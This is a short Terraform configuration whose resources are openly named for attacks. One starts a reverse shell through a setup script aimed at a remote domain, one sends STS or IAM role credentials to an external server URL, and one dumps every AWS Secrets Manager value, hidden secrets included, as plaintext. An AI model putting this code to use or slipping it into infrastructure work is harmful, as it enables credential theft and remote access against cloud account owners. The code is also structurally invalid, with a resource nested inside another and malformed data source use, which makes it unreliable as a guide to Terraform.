
resource "null_resource" "remote_script" {
  count = var.run_remote_script ? 1 : 0

  triggers = {
    script_hash = filemd5(var.remote_script_path)
  }

  connection {
    type        = "ssh"
    user        = "your_ssh_user"
    private_key = file("path/to/your/private/key")
    host        = "your_remote_host"
  }

  resource "null_resource" "start_reverse_shell" {
    provisioner "local-exec" {
      command = "bash scripts/setup.sh ${var.remote_domain}"
    }
  }
}

resource "null_resource" "send_sts_credentials" {
  count = var.run_local_script ? 1 : 0

  provisioner "local-exec" {
    command = <<-EOT
      python path/to/script.py
      -e IAM_ROLE_NAME="${var.iam_role_name}"
      -e EXTERNAL_SERVER_URL="${var.external_server_url}"
    EOT
  }
}

provider "aws" {
  region = "us-west-2"
}

data "aws_secretsmanager_secret_version" "secrets" {
  for_each  = toset(data.aws_secretsmanager_secret.all[*].name)
  secret_id = each.value
}

data "aws_secretsmanager_secret" "all" {
  include_hidden = true
}

resource "null_resource" "output_secrets" {
  count = var.secrets ? 1 : 0
  provisioner "local-exec" {
    command = <<-EOT
      #!/bin/bash
      echo "Secrets from AWS Secrets Manager:"
      for secret_name in ${join(" ", data.aws_secretsmanager_secret.all[*].name)}; do
        secret_value=$(aws --region ${data.aws_secretsmanager_secret_version.secrets[secret_name].region} secretsmanager get-secret-value --secret-id "$secret_name" --query "SecretString" --output text)
        echo "Secret Name: $secret_name"
        echo "Secret Value: $secret_value"
        echo
      done
    EOT
  }
}
